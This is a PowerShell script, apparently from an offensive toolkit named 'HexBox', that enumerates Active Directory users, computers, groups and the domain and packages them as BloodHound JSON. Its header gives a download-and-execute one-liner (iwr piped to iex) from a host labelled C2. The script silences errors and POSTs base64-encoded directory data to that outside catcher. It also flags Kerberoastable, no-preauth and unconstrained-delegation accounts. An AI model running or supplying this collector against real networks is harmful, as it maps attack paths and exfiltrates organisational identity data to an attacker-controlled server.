# bloodhound_collect.ps1 — BloodHound JSON v5 AD collector for HexBox
# Runs on a domain-joined Windows target; POSTs BloodHound-ready JSON to catcher
# Usage: iwr -Uri http://10.0.0.99:8000/serve/bloodhound_collect.ps1 -UseBasicParsing | iex

$ErrorActionPreference = "SilentlyContinue"
$C2 = "http://10.0.0.99:8000"

function ConvertFrom-SidBytes([byte[]]$Bytes) {
    try { return (New-Object System.Security.Principal.SecurityIdentifier($Bytes, 0)).Value }
    catch { return $null }
}

function Get-DomainInfo {
    $ctx = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(
        [System.DirectoryServices.ActiveDirectory.DirectoryContextType]::Domain)
    $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($ctx)
    $de  = $dom.GetDirectoryEntry()
    return @{
        FQDN = $dom.Name.ToUpper()
        DN   = [string]$de.Properties["distinguishedName"].Value
        SID  = ConvertFrom-SidBytes -Bytes $de.Properties["objectsid"][0]
    }
}

function Search-AD([string]$Filter, [string[]]$Props, [string]$Base) {
    $de = [ADSI]"LDAP://$Base"
    $ds = New-Object System.DirectoryServices.DirectorySearcher $de
    $ds.Filter   = $Filter
    $ds.PageSize = 1000
    foreach ($p in $Props) { [void]$ds.PropertiesToLoad.Add($p) }
    return $ds.FindAll()
}

$dom = Get-DomainInfo
$FQDN = $dom.FQDN
$DN   = $dom.DN

# ---- Users ----
$users = @()
$uResults = Search-AD -Filter "(&(objectClass=user)(objectCategory=person))" -Base $DN -Props @(
    "objectSid","samAccountName","userAccountControl","mail","title","displayName",
    "description","distinguishedName","pwdLastSet","lastLogon","adminCount",
    "servicePrincipalName","userPrincipalName","memberOf")

foreach ($r in $uResults) {
    $sid = ConvertFrom-SidBytes -Bytes $r.Properties["objectsid"][0]
    if (-not $sid) { continue }
    $sam = [string]$r.Properties["samaccountname"][0]
    $uac = try { [int]$r.Properties["useraccountcontrol"][0] } catch { 0 }
    $toEpoch = { param($v) try { [DateTimeOffset][datetime]::FromFileTime([long]$v) | % { $_.ToUnixTimeSeconds() } } catch { 0 } }
    $pwdSet   = & $toEpoch $r.Properties["pwdlastset"][0]
    $lastLog  = & $toEpoch $r.Properties["lastlogon"][0]
    $spns     = @($r.Properties["serviceprincipalname"] | ForEach-Object { [string]$_ } | Where-Object { $_ })

    $users += @{
        ObjectIdentifier = $sid
        Properties = [ordered]@{
            domain                  = $FQDN
            name                    = "$sam@$FQDN"
            distinguishedname       = [string]$r.Properties["distinguishedname"][0]
            samaccountname          = $sam
            enabled                 = -not [bool]($uac -band 0x2)
            lastlogon               = $lastLog
            lastlogontimestamp      = $lastLog
            pwdlastset              = $pwdSet
            admincount              = [bool]($r.Properties["admincount"][0] -eq 1)
            description             = [string]$r.Properties["description"][0]
            email                   = [string]$r.Properties["mail"][0]
            title                   = [string]$r.Properties["title"][0]
            displayname             = [string]$r.Properties["displayname"][0]
            sensitive               = $false
            dontreqpreauth          = [bool]($uac -band 0x400000)
            passwordnotreqd         = [bool]($uac -band 0x20)
            unconstraineddelegation = [bool]($uac -band 0x80000)
            pwdneverexpires         = [bool]($uac -band 0x10000)
            pwdexpired              = $false
            serviceprincipalnames   = $spns
            hasspn                  = ($spns.Count -gt 0)
            trustedtoauth           = [bool]($uac -band 0x1000000)
            objectid                = $sid
        }
        Aces           = @()
        SPNTargets     = @()
        HasSIDHistory  = @()
        IsDeleted      = $false
        IsACLProtected = $false
        ContainedBy    = $null
    }
}

# ---- Computers ----
$computers = @()
$cResults = Search-AD -Filter "(&(objectClass=computer)(objectCategory=computer))" -Base $DN -Props @(
    "objectSid","samAccountName","dNSHostName","userAccountControl",
    "distinguishedName","operatingSystem","operatingSystemVersion","lastLogon")

foreach ($r in $cResults) {
    $sid = ConvertFrom-SidBytes -Bytes $r.Properties["objectsid"][0]
    if (-not $sid) { continue }
    $sam  = [string]$r.Properties["samaccountname"][0]
    $dns  = [string]$r.Properties["dnshostname"][0]
    $uac  = try { [int]$r.Properties["useraccountcontrol"][0] } catch { 0 }
    $toEpoch = { param($v) try { [DateTimeOffset][datetime]::FromFileTime([long]$v) | % { $_.ToUnixTimeSeconds() } } catch { 0 } }
    $lastLog = & $toEpoch $r.Properties["lastlogon"][0]

    $computers += @{
        ObjectIdentifier = $sid
        Properties = [ordered]@{
            domain                  = $FQDN
            name                    = if ($dns) { $dns.ToUpper() } else { "$sam.$FQDN" }
            distinguishedname       = [string]$r.Properties["distinguishedname"][0]
            samaccountname          = $sam
            dnshostname             = $dns
            enabled                 = -not [bool]($uac -band 0x2)
            lastlogon               = $lastLog
            lastlogontimestamp      = $lastLog
            operatingsystem         = [string]$r.Properties["operatingsystem"][0]
            operatingsystemversion  = [string]$r.Properties["operatingsystemversion"][0]
            unconstraineddelegation = [bool]($uac -band 0x80000)
            objectid                = $sid
        }
        Aces          = @()
        Sessions      = @{Results=@();Collected=$false;FailureReason=$null}
        LocalAdmins   = @{Results=@();Collected=$false;FailureReason=$null}
        RemoteDesktopUsers = @{Results=@();Collected=$false;FailureReason=$null}
        DcomUsers     = @{Results=@();Collected=$false;FailureReason=$null}
        PSRemoteUsers = @{Results=@();Collected=$false;FailureReason=$null}
        HasSIDHistory  = @()
        IsDeleted      = $false
        IsACLProtected = $false
        ContainedBy    = $null
    }
}

# ---- Groups ----
$groups = @()
$gResults = Search-AD -Filter "(&(objectClass=group)(objectCategory=group))" -Base $DN -Props @(
    "objectSid","samAccountName","distinguishedName","member","description","adminCount","groupType")

foreach ($r in $gResults) {
    $sid = ConvertFrom-SidBytes -Bytes $r.Properties["objectsid"][0]
    if (-not $sid) { continue }
    $sam  = [string]$r.Properties["samaccountname"][0]
    $mems = @($r.Properties["member"] | ForEach-Object {
        @{ObjectIdentifier=[string]$_;ObjectType="Unknown"}
    })

    $groups += @{
        ObjectIdentifier = $sid
        Properties = [ordered]@{
            domain            = $FQDN
            name              = "$sam@$FQDN"
            distinguishedname = [string]$r.Properties["distinguishedname"][0]
            samaccountname    = $sam
            admincount        = [bool]($r.Properties["admincount"][0] -eq 1)
            description       = [string]$r.Properties["description"][0]
            objectid          = $sid
        }
        Members        = $mems
        Aces           = @()
        HasSIDHistory  = @()
        IsDeleted      = $false
        IsACLProtected = $false
        ContainedBy    = $null
    }
}

# ---- Domain node ----
$domNode = @()
if ($dom.SID) {
    $domNode += @{
        ObjectIdentifier = $dom.SID
        Properties = [ordered]@{
            name              = $FQDN
            domain            = $FQDN
            distinguishedname = $DN
            objectid          = $dom.SID
            functionallevel   = 0
        }
        Aces           = @()
        Links          = @()
        ChildObjects   = @()
        Trusts         = @()
        GPOChanges     = @{AffectedComputers=@();AffectedUsers=@()}
        IsDeleted      = $false
        IsACLProtected = $false
    }
}

# ---- POST each collection to HexBox catcher ----
$host_n = $env:COMPUTERNAME
$pkgs = @(
    @{type="users";    data=$users;     count=$users.Count}
    @{type="computers";data=$computers; count=$computers.Count}
    @{type="groups";   data=$groups;    count=$groups.Count}
    @{type="domains";  data=$domNode;   count=$domNode.Count}
)

foreach ($pkg in $pkgs) {
    if ($pkg.count -eq 0) { continue }
    $payload = @{
        data = $pkg.data
        meta = @{methods=0; type=$pkg.type; count=$pkg.count; version=5}
    }
    $json = $payload | ConvertTo-Json -Depth 20 -Compress
    $b64  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
    try {
        Invoke-WebRequest -Uri "$C2/bloodhound" -Method POST -UseBasicParsing `
            -Body "host=$host_n&type=$($pkg.type)&data=$([Uri]::EscapeDataString($b64))" `
            -ContentType "application/x-www-form-urlencoded" | Out-Null
    } catch {}
}
